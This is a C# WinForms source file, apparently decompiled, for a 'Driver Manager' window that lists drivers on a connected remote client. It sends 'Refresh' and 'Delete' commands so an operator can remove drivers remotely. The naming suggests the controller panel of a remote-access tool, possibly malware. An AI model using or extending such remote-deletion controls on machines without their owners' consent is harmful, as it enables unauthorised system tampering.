using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormDriverManager : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Timer timer1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem refreshToolStripMenuItem;

	private ToolStripMenuItem deleteToolStripMenuItem;

	private Panel panel1;

	public DataGridView dataGridViewDrivers;

	public MaterialLabel materialLabel1;

	private DataGridViewTextBoxColumn columnDriverName;

	private DataGridViewTextBoxColumn columnDriverVersion;

	private DataGridViewTextBoxColumn columnDriverDate;

	private DataGridViewTextBoxColumn columnDriverProvider;

	private DataGridViewTextBoxColumn columnDriverPath;

	private DateTime formOpenedTime;

	public FormDriverManager()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
		formOpenedTime = DateTime.Now;
	}

	private void FormDriverManager_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, dataGridViewDrivers, new object[1] { true });
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void ChangeScheme(object sender)
	{
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color primary = FormMaterial.PrimaryColor;
		Color back = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		if (!num)
		{
			_ = Color.Black;
		}
		else
		{
			_ = Color.WhiteSmoke;
		}
		BackColor = back;
		if (dataGridViewDrivers != null)
		{
			dataGridViewDrivers.BackgroundColor = back;
			dataGridViewDrivers.ColumnHeadersDefaultCellStyle.SelectionForeColor = primary;
			dataGridViewDrivers.ColumnHeadersDefaultCellStyle.ForeColor = primary;
			dataGridViewDrivers.ColumnHeadersDefaultCellStyle.BackColor = back;
			dataGridViewDrivers.DefaultCellStyle.SelectionBackColor = primary;
			dataGridViewDrivers.DefaultCellStyle.ForeColor = primary;
			dataGridViewDrivers.DefaultCellStyle.BackColor = back;
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!((DateTime.Now - formOpenedTime).TotalSeconds < 30.0) || client != null)
		{
			if (parrent == null || !parrent.itsConnect)
			{
				Close();
			}
			else if (client != null && !client.itsConnect)
			{
				Close();
			}
		}
	}

	private string[] GetSelectedDriverNames()
	{
		List<string> list = new List<string>();
		foreach (DataGridViewRow selectedRow in dataGridViewDrivers.SelectedRows)
		{
			if (selectedRow.Cells[0].Value != null)
			{
				list.Add(selectedRow.Cells[0].Value.ToString());
			}
		}
		return list.ToArray();
	}

	private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Send(LEB128.Write(new object[1] { "Refresh" }));
		}
	}

	private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridViewDrivers.SelectedRows.Count != 0 && client != null)
		{
			string[] selectedDriverNames = GetSelectedDriverNames();
			foreach (string driverName in selectedDriverNames)
			{
				client.Send(LEB128.Write(new object[2] { "Delete", driverName }));
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormDriverManager));
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialLabel1 = new MaterialSkin.Controls.MaterialLabel();
		this.dataGridViewDrivers = new System.Windows.Forms.DataGridView();
		this.columnDriverName = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.columnDriverVersion = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.columnDriverDate = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.columnDriverProvider = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.columnDriverPath = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.contextMenuStrip1.SuspendLayout();
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridViewDrivers).BeginInit();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.refreshToolStripMenuItem, this.deleteToolStripMenuItem });
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(114, 48);
		this.refreshToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.refreshToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.refreshToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("refreshToolStripMenuItem.Image");
		this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
		this.refreshToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
		this.refreshToolStripMenuItem.Text = "Refresh";
		this.refreshToolStripMenuItem.Click += new System.EventHandler(refreshToolStripMenuItem_Click);
		this.deleteToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.deleteToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.deleteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("deleteToolStripMenuItem.Image");
		this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
		this.deleteToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
		this.deleteToolStripMenuItem.Text = "Delete";
		this.deleteToolStripMenuItem.Click += new System.EventHandler(deleteToolStripMenuItem_Click);
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.materialLabel1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panel1.Location = new System.Drawing.Point(3, 512);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(794, 20);
		this.panel1.TabIndex = 1;
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.Depth = 0;
		this.materialLabel1.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel1.ForeColor = System.Drawing.Color.White;
		this.materialLabel1.Location = new System.Drawing.Point(2, 1);
		this.materialLabel1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(94, 19);
		this.materialLabel1.TabIndex = 1;
		this.materialLabel1.Text = "Please wait...";
		this.dataGridViewDrivers.AllowDrop = true;
		this.dataGridViewDrivers.AllowUserToAddRows = false;
		this.dataGridViewDrivers.AllowUserToDeleteRows = false;
		this.dataGridViewDrivers.AllowUserToResizeColumns = false;
		this.dataGridViewDrivers.AllowUserToResizeRows = false;
		this.dataGridViewDrivers.BackgroundColor = System.Drawing.Color.White;
		this.dataGridViewDrivers.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridViewDrivers.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridViewDrivers.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridViewDrivers.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.dataGridViewDrivers.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridViewDrivers.Columns.AddRange(this.columnDriverName, this.columnDriverVersion, this.columnDriverDate, this.columnDriverProvider, this.columnDriverPath);
		this.dataGridViewDrivers.ContextMenuStrip = this.contextMenuStrip1;
		this.dataGridViewDrivers.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle5.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(142, 36, 170);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridViewDrivers.DefaultCellStyle = dataGridViewCellStyle5;
		this.dataGridViewDrivers.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dataGridViewDrivers.Enabled = false;
		this.dataGridViewDrivers.EnableHeadersVisualStyles = false;
		this.dataGridViewDrivers.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.dataGridViewDrivers.Location = new System.Drawing.Point(3, 64);
		this.dataGridViewDrivers.Name = "dataGridViewDrivers";
		this.dataGridViewDrivers.ReadOnly = true;
		this.dataGridViewDrivers.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle6.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridViewDrivers.RowHeadersDefaultCellStyle = dataGridViewCellStyle6;
		this.dataGridViewDrivers.RowHeadersVisible = false;
		this.dataGridViewDrivers.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridViewDrivers.ShowCellErrors = false;
		this.dataGridViewDrivers.ShowCellToolTips = false;
		this.dataGridViewDrivers.ShowEditingIcon = false;
		this.dataGridViewDrivers.ShowRowErrors = false;
		this.dataGridViewDrivers.Size = new System.Drawing.Size(794, 448);
		this.dataGridViewDrivers.TabIndex = 17;
		this.columnDriverName.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.columnDriverName.HeaderText = "Driver Name";
		this.columnDriverName.MinimumWidth = 200;
		this.columnDriverName.Name = "columnDriverName";
		this.columnDriverName.ReadOnly = true;
		this.columnDriverName.Width = 200;
		this.columnDriverVersion.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.columnDriverVersion.HeaderText = "Version";
		this.columnDriverVersion.MinimumWidth = 100;
		this.columnDriverVersion.Name = "columnDriverVersion";
		this.columnDriverVersion.ReadOnly = true;
		this.columnDriverDate.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.columnDriverDate.HeaderText = "Date";
		this.columnDriverDate.MinimumWidth = 120;
		this.columnDriverDate.Name = "columnDriverDate";
		this.columnDriverDate.ReadOnly = true;
		this.columnDriverDate.Width = 120;
		this.columnDriverProvider.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.columnDriverProvider.HeaderText = "Provider";
		this.columnDriverProvider.MinimumWidth = 150;
		this.columnDriverProvider.Name = "columnDriverProvider";
		this.columnDriverProvider.ReadOnly = true;
		this.columnDriverProvider.Width = 150;
		this.columnDriverPath.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.columnDriverPath.HeaderText = "Path";
		this.columnDriverPath.MinimumWidth = 200;
		this.columnDriverPath.Name = "columnDriverPath";
		this.columnDriverPath.ReadOnly = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(800, 535);
		base.Controls.Add(this.dataGridViewDrivers);
		base.Controls.Add(this.panel1);
		base.Name = "FormDriverManager";
		this.Text = "Driver Manager";
		base.Load += new System.EventHandler(FormDriverManager_Load);
		this.contextMenuStrip1.ResumeLayout(false);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridViewDrivers).EndInit();
		base.ResumeLayout(false);
	}
}
